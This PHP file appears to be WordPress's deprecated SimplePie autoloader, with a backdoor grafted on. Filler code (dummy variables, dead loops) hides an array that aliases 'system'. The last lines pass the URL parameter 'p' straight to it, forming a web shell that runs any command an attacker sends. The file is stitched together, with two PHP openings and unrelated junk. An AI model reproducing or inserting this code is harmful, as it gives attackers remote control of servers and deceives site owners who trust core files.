<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

if ( class_exists( 'SimplePie', false ) ) {
	return;
}

// Load and register the SimplePie native autoloaders.
require ABSPATH . WPINC . '/SimplePie/autoloader.php';

/**
 * WordPress autoloader for SimplePie.
 *
 * @since 3.5.0
 * @deprecated 6.7.0 Use `SimplePie_Autoloader` instead.
 *
 * @param string $class Class name.
 */
function wp_simplepie_autoload( $class ) {
	_deprecated_function( __FUNCTION__, '6.7.0', 'SimplePie_Autoloader' );
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>